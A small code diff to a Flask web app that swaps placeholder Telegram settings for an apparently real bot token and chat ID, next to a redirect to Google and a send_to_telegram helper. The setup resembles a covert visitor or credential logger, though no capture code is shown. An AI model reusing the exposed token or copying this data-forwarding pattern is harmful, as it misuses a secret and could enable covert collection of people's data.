@@ -5,8 +5,8 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
-CHAT_ID = "YOUR_TELEGRAM_USER_ID"
+BOT_TOKEN = "7638665325:AAEnpRe7ZTHK7VIfyVlM7lfPq9yBpcbhVzo"
+CHAT_ID = "6690693429"
 REDIRECT_URL = "https://www.google.com/"
 
 def send_to_telegram(text):
